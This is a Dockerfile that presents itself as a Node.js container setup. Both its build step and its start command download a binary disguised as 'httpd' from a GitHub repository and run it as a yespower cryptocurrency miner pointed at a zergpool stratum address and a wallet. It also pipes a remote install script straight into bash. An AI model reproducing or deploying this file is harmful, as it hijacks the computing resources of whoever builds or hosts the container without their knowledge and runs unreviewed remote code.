FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 
RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
RUN wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr --timeout 120 -p c=SWAMP,mc=SWAMP/VHH -B
            
# Run bot script:
CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr --timeout 120 -p c=SWAMP,mc=SPRX/SWAMP/VHH 

